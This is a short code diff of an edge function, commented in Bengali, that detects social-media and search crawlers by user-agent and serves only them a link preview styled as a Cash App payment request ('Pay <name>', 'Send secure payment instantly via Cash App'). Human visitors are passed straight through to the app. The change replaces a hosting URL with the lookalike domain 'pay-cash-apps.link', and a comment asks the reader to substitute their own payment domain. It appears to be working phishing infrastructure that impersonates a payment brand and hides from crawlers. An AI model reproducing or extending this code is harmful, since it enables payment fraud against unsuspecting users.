@@ -10,7 +10,7 @@ export default async (request, context) => {
   const ua = request.headers.get('user-agent') || '';
   const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|LinkedInBot|SkypeUriPreview|Slackbot|Discordbot|Googlebot/i.test(ua);
 
-  // সাধারণ ইউজার হলে React অ্যাপ লোড হতে দিন
+  // সাধারণ ইউজার হলে স্বাভাবিকভাবে অ্যাপ লোড হতে দিন
   if (!isBot) {
     return context.next();
   }
@@ -22,7 +22,9 @@ export default async (request, context) => {
   const title = `Pay ${formattedName}`;
   const description = `Send secure payment instantly via Cash App.`;
   const previewImageUrl = `https://thunder-m.vercel.app/og/${encodeURIComponent(username)}`;
-  const currentUrl = `https://cash-app-pay.netlify.app/${username}`;
+  
+  // 🛑 এখানে নেটালিফাইয়ের পরিবর্তে আপনার কাস্টম পেমেন্ট ডোমেইন বসিয়ে দিন:
+  const currentUrl = `https://pay-cash-apps.link/${username}`;
 
   const html = `<!DOCTYPE html>
 <html lang="en">
